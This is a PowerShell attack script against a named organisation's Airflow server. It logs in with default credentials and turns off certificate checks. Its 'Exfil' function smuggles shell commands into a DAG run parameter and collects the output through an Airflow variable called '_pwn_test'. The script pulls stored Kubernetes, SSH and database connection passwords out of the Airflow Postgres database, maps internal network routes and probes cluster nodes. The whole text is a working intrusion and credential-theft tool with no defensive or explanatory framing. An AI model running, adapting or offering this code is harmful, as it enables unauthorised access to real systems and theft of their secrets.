Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path"); $req.Method = "POST"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body); $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse(); $r = New-Object System.IO.StreamReader($resp.GetResponseStream()); return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path"); $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded"); $req.Accept = "application/json"
        $resp = $req.GetResponse(); $r = New-Object System.IO.StreamReader($resp.GetResponseStream()); return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function Exfil($cmd) {
    $ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
    $inject = '30"; (' + $cmd + ') 2>&1 | head -c 3000 | base64 -w0 | xargs -I{} curl -sk -X PATCH ' + $base + '/api/v1/variables/_pwn_test -H "Authorization: Basic ' + $encoded + '" -H "Content-Type: application/json" -d "{\"key\":\"_pwn_test\",\"value\":\"{}\"}"; echo "'
    $body = @{ conf = @{ maxLogAgeInDays = $inject }; logical_date = $ts } | ConvertTo-Json -Depth 10
    AF-Post "/api/v1/dags/maintenance_logs_cleanup/dagRuns" $body | Out-Null
    Start-Sleep 15
    $r = (AF-Get "/api/v1/variables/_pwn_test" | ConvertFrom-Json).value
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($r)) }
    catch { return $r }
}

# Query Airflow PostgreSQL DB directly to get connection passwords
Write-Host "=== AIRFLOW DB - connection passwords ==="
Write-Host (Exfil "python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); cur=c.cursor(); cur.execute(\"SELECT conn_id,conn_type,host,login,password,port,schema,extra FROM connection WHERE conn_type IN (\\\"kubernetes\\\",\\\"ssh\\\") OR conn_id LIKE \\\"%kube%\\\" OR conn_id LIKE \\\"%k8s%\\\" LIMIT 20\"); [print(r) for r in cur.fetchall()]'")

Write-Host "`n=== AIRFLOW DB - ALL conn passwords (first 30) ==="
Write-Host (Exfil "python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); cur=c.cursor(); cur.execute(\"SELECT conn_id,conn_type,host,login,password FROM connection LIMIT 30\"); [print(r) for r in cur.fetchall()]'")

Write-Host "`n=== AIRFLOW DB - kubernetes_default connection ==="
Write-Host (Exfil "python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); cur=c.cursor(); cur.execute(\"SELECT conn_id,conn_type,host,login,password,port,schema,extra FROM connection WHERE conn_id=\\\"kubernetes_default\\\"\"); [print(r) for r in cur.fetchall()]'")

Write-Host "`n=== IP ROUTE ==="
Write-Host (Exfil "ip route show; echo '---'; ip addr show; echo '---'; netstat -rn 2>/dev/null || ss -rn 2>/dev/null || cat /proc/net/route")

Write-Host "`n=== PING K8s node ==="
Write-Host (Exfil "ping -c 1 -W 2 10.9.100.10 2>&1 && ping -c 1 -W 2 10.9.101.90 2>&1")

Write-Host "`n=== kubectl in PATH ==="
Write-Host (Exfil "which kubectl 2>&1; find / -name 'kubectl' 2>/dev/null | head -5")

Write-Host "`n=== AIRFLOW DB - confins_r3 passwords ==="
Write-Host (Exfil "python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); cur=c.cursor(); cur.execute(\"SELECT conn_id,host,login,password FROM connection WHERE conn_id LIKE \\\"%confins%\\\" OR conn_id LIKE \\\"%r3%\\\"  LIMIT 20\"); [print(r) for r in cur.fetchall()]'")
